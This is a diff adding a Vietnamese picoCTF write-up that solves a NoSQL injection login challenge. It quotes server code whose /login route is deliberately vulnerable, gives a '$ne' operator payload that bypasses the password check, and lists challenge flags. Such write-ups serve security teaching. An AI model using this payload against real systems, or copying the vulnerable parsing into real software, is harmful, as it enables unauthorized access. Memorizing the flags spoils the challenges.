@@ -502,3 +502,184 @@ Với lệnh `ls ..`, chúng ta thấy có một file đáng nghi là `GQ4DOOBVM
 ### Flag
 
 `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}`
+
+## No Sql Injection
+
+> Author: NGIRIMANA Schadrack
+>
+> Can you try to get access to this website to get the flag?
+> You can download the source [here](sources/no-sql-injection.zip).
+>
+> **Hints**
+>
+> Not only SQL injection exist but also NonSQL injection exists.\
+> Make sure you look at everything the server is sending back.
+
+### Solution
+
+Chúng ta có một trang web cho phép đăng nhập:
+
+![image](images/no-sql-injection/image-1.png)
+
+Cùng phân tích source code được cung cấp để hiểu rõ cách thực hoạt động của trang web:
+
+```text
+.
+├── admin.html
+├── index.html
+├── package.json
+└── server.js
+```
+
+Ở file `server.js` là code xử lý của server:
+
+```js
+const express = require("express");
+const bodyParser = require("body-parser");
+const mongoose = require("mongoose");
+const { MongoMemoryServer } = require("mongodb-memory-server");
+const path = require("path");
+const crypto = require("crypto");
+
+const app = express();
+const port = process.env.PORT | 3000;
+
+// Middleware to parse JSON data
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+// User schema and model
+const userSchema = new mongoose.Schema({
+  email: { type: String, required: true, unique: true },
+  firstName: { type: String, required: true },
+  lastName: { type: String, required: true },
+  password: { type: String, required: true },
+  token: { type: String, required: false, default: "{{Flag}}" },
+});
+
+const User = mongoose.model("User", userSchema);
+
+// Initialize MongoMemoryServer and connect to it
+async function startServer() {
+  try {
+    const mongoServer = await MongoMemoryServer.create();
+    const mongoUri = mongoServer.getUri();
+    await mongoose.connect(mongoUri);
+
+    // Store initial user
+    const initialUser = new User({
+      firstName: "pico",
+      lastName: "player",
+      email: "picoplayer355@picoctf.org",
+      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
+    });
+    await initialUser.save();
+
+    // Serve the HTML form
+    app.get("/", (req, res) => {
+      res.sendFile(path.join(__dirname, "index.html"));
+    });
+
+    // Serve the admin page
+    app.get("/admin", (req, res) => {
+      res.sendFile(path.join(__dirname, "admin.html"));
+    });
+
+    // Handle login form submission with JSON
+    app.post("/login", async (req, res) => {
+      const { email, password } = req.body;
+
+      try {
+        const user = await User.findOne({
+          email:
+            email.startsWith("{") && email.endsWith("}")
+              ? JSON.parse(email)
+              : email,
+          password:
+            password.startsWith("{") && password.endsWith("}")
+              ? JSON.parse(password)
+              : password,
+        });
+
+        if (user) {
+          res.json({
+            success: true,
+            email: user.email,
+            token: user.token,
+            firstName: user.firstName,
+            lastName: user.lastName,
+          });
+        } else {
+          res.json({ success: false });
+        }
+      } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+      }
+    });
+
+    app.listen(port, () => {
+    });
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+startServer().catch((err) => console.error(err));
+
+```
+
+Để lấy được flag, chúng ta cần phải đăng nhập thành công vào email `picoplayer355@picoctf.org`. Tuy nhiên, chúng ta lại không biết mật khẩu của người dùng này bởi nó được tạo ngẫu nhiên.
+
+Chúng ta cần tập trung vào đoạn code xử lý tại route `/login`:
+
+```js
+app.post("/login", async (req, res) => {
+      const { email, password } = req.body;
+
+      try {
+        const user = await User.findOne({
+          email:
+            email.startsWith("{") && email.endsWith("}")
+              ? JSON.parse(email)
+              : email,
+          password:
+            password.startsWith("{") && password.endsWith("}")
+              ? JSON.parse(password)
+              : password,
+        });
+
+        if (user) {
+          res.json({
+            success: true,
+            email: user.email,
+            token: user.token,
+            firstName: user.firstName,
+            lastName: user.lastName,
+          });
+        } else {
+          res.json({ success: false });
+        }
+      } catch (err) {
+        res.status(500).json({ success: false, error: err.message });
+      }
+    });
+```
+
+Trong trường hợp giá trị của tham số `email` hoặc `password` mà bắt đầu với `{` và kết thúc với `}` thì nó sẽ được chuyển thành `object` bởi hàm `JSON.parse()`. Cộng thêm việc server sử dụng `mongoose` nên đó chính là điều kiện lý tưởng để khai thác lỗi NoSQL Injection.
+
+Do đó, chúng ta sẽ có thể sử dụng payload sau để gửi request. Thực hiện đăng nhập với điều kiện `email` là `picoplayer355@picoctf.org` và `password` không phải là `xxx`:
+
+```json
+{
+  "email":"picoplayer355@picoctf.org",
+  "password":"{\"$ne\":\"xxx\"}"
+}
+```
+
+Gửi request và lụm thành công flag:
+
+![image](images/no-sql-injection/image-2.png)
+
+### Flag
+
+`picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_25ba4de1}`
